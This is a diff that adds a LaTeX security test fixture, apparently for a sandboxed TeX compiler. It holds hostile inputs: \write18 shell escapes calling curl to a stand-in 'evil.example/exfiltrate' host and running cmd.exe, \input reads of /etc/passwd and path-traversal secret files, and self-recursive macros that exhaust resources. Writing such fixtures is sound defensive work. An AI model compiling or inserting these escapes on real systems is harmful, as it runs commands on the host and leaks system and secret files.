@@ -1,0 +1,13 @@
+\documentclass{article}
+\begin{document}
+% SEC-TEX fixture: none of these may be executed or resolved outside the workspace.
+\write18{curl http://evil.example/exfiltrate}
+\immediate\write18{cmd.exe /c whoami > C:/temp/leak.txt}
+\input{/etc/passwd}
+\input{../../secret.tex}
+\input{C:/Users/Public/secret.tex}
+\def\bomb{\bomb\bomb}
+\bomb
+\newcommand{\recurse}{\recurse\recurse}
+\recurse
+\end{document}
